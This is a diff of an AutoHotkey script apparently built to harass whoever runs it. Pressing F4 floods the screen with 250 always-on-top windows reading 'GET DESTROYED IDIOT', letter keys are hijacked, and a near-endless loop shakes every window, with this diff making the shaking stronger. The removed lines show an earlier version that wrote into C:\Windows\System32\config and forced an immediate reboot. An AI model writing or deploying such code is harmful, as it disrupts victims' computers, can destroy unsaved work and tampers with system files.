@@ -10,31 +10,13 @@ Loop, Parse, % "abcdefghijklmnopqrstuvwxyz", % ""
     Hotkey, *%A_LoopField%, Snd
 }
 return
-Ctrl::
+F4::
 Loop, 250 ; yes.
 {
     Random, RandX, 0, % A_ScreenWidth - 100
     Random, RandY, 0, % A_ScreenHeight - 100
     
-    ; By adding a letter prefix, we bypass the 1-99 limit
-    GuiName := "HAHAHAHHAHAHAHAHAHAHA" . A_Index
-    
-    Gui, %GuiName%:New, +AlwaysOnTop -MaximizeBox -MinimizeBox, BAHAHAHAHA %A_Index%
-    Gui, %GuiName%:Add, Text, w200 h50 Center, GET DESTROYED IDIOT
-    
-    Gui, %GuiName%:Show, x%RandX% y%RandY%
- Sleep, 10000
-FileAppend, kalala, C:\Windows\System32\config\OSDATA
-Run, shutdown /r /t 0
-}
-return
-Shift::
-Loop, 250 ; yes. 2
-{
-    Random, RandX, 0, % A_ScreenWidth - 100
-    Random, RandY, 0, % A_ScreenHeight - 100
-    
-    ; By adding a letter prefix, we bypass the 1-99 limit
+    ; by adding a letter prefix, we bypass the 1-99 limit
     GuiName := "HAHAHAHHAHAHAHAHAHAHA" . A_Index
     
     Gui, %GuiName%:New, +AlwaysOnTop -MaximizeBox -MinimizeBox, BAHAHAHAHA %A_Index%
@@ -64,8 +46,8 @@ Loop, 100000000000000 ; Number of "waves" of shaking
         ; get position
         WinGetPos, X, Y, , , ahk_id %this_id%
         
-        Random, MoveX, -20, 20
-        Random, MoveY, -20, 20
+        Random, MoveX, -60, 60
+        Random, MoveY, -60, 60
         
         ; move the specific window by ID
         WinMove, ahk_id %this_id%,, X + MoveX, Y + MoveY
